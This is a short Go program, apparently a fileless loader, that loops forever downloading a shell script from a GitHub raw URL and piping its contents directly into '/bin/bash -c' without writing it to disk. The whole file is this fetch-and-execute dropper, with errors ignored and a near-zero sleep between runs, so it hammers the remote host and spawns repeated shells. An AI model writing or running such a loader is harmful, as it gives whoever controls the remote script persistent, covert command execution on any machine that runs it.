package main

import (
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

func main() {
	for {
		url := "https://raw.githubusercontent.com/noob-Engle/Executing-fileless-scripts/main/bashtest.sh"
		resp, _ := http.Get(string(url))
		defer resp.Body.Close()

		shellScriptBody, _ := ioutil.ReadAll(resp.Body)

		cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
		cmd.Start()      
		time.Sleep(5000) 
	}
}
